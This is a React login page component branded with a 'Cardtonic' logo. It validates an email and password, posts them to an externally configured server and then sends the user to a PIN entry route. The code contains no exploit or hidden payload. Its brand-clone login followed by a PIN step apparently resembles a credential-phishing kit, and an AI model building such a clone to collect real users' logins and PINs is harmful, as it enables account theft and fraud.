import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import logo from "../assets/logo.svg";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .min(10, "Password must be at least 10 characters")
    .max(30, "Password cannot exceed 30 characters")
    .required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="login-page">
      <div className="login-container">
        <div className="logo">
          <img src={logo} alt="Cardtonic Logo" />
        </div>
        <h2>Login With Email.</h2>
        <p>Please enter email and password to login to your account.</p>
        <form onSubmit={handleSubmit(submitForm)}>
          <div className="form-group">
            <input
              name="email"
              type="email"
              placeholder="Enter Your Email"
              {...register("email")}
              required
            />
            <FormErrMsg errors={errors} inputName="email" />
          </div>

          <div className="form-group">
            <input
              name="password"
              type="password"
              placeholder="Enter Password"
              {...register("password")}
              required
            />
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          <a href="/forgot-password" className="forgot-password">
            Forgot Password?
          </a>
          <div className="ff">
            {" "}
            <p className="signup-text">
              Not yet a user? <a href="/signup">Create account</a>
            </p>
            <button type="submit" className="submit-btn" disabled={loading}>
              {loading ? "Loading..." : "Submit"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Home;
